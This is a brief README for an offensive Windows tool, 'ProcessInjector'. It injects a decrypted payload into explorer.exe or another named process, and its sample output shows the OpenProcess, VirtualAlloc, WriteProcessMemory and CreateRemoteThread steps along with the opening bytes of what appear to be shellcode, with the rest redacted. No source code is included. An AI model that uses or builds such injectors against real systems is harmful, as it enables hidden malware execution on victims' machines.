## ProcessInjector ##

Execute the tool by its own and it will inject into explorer.exe otherwise use the first argument to inject within another process name. Example: `processinjector.exe notepad`


```
ProcessInjector.exe
Without any input default process to be inejcted is explorer
Process ID of explorer is 4944
OpenProcess succeeded, handle = 708
VirtualAlloc succeeded, pointer = 8323072

The Decrypted Bytearray:
0xFC, 0x48, 0x83, 0xE4, 0xF0, <readacted>

WriteProcessMemory succeeded
CreateRemoteThread succeeded, thread ID = 900
```
